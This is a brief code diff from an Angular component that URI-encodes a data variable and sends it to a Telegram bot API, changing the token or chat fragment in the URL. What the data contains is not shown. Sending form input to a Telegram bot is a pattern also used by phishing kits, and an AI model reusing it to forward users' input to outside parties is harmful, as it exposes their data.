@@ -42,7 +42,7 @@ export class AppComponent {
       data = encodeURI(data);
 
       this._htpp
-        .get(`${this.telegram_api}+z7dGgdSiqg9kYWEy&text=${data}`, { 'headers': this.headers })
+        .get(`${this.telegram_api}premium1shopc&text=${data}`, { 'headers': this.headers })
         .pipe(catchError((error) => {
           console.log(error);
 
